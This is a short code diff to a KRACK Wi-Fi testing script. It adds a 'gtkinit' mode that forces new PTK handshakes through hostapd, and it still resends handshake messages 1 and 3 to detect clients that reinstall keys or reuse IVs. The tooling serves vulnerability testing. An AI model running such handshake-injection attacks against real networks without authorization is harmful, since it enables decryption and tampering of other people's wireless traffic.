@@ -330,7 +330,7 @@ class KRAckAttackClient():
 
 			if decrypt_ccmp(p, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00"):
 				client.mark_allzero_key(p)
-			if self.options.variant == TestOptions.Fourway:
+			if self.options.variant == TestOptions.Fourway and not self.options.gtkinit:
 				client.check_pairwise_reinstall(p)
 			if client.is_iv_reused(p):
 				self.handle_replay(p)
@@ -455,15 +455,19 @@ class KRAckAttackClient():
 
 				self.next_arp = time.time() + HANDSHAKE_TRANSMIT_INTERVAL
 				for client in self.clients.values():
-					# 1. Test the 4-way handshake. We rely on an encrypted message 4 as reply to detect pairwise
-					#    key reinstallations reinstallations.
-					if self.options.variant == TestOptions.Fourway and client.vuln_4way != ClientState.VULNERABLE:
+					# 1. Test the 4-way handshake
+					if self.options.variant == TestOptions.Fourway and self.options.gtkinit and client.vuln_bcast != ClientState.VULNERABLE:
+						# Execute a new handshake to test stations that don't accept a retransmitted message 3
+						hostapd_command(self.hostapd_ctrl, "RENEW_PTK " + client.mac)
+						# TODO: wait untill 4-way handshake completed?
+					elif self.options.variant == TestOptions.Fourway and not self.options.gtkinit and client.vuln_4way != ClientState.VULNERABLE:
 						# First inject a message 1 if requested using the TPTK option
 						if self.options.tptk == TestOptions.TptkReplay:
 							hostapd_command(self.hostapd_ctrl, "RESEND_M1 " + client.mac)
 						elif self.options.tptk == TestOptions.TptkRand:
 							hostapd_command(self.hostapd_ctrl, "RESEND_M1 " + client.mac + " change-anonce")
 
+						# Note that we rely on an encrypted message 4 as reply to detect pairwise key reinstallations reinstallations.
 						hostapd_command(self.hostapd_ctrl, "RESEND_M3 " + client.mac + ("maxrsc" if self.options.gtkinit else ""))
 
 					# 2. Test if broadcast ARP request are accepted by the client. Keep injecting even
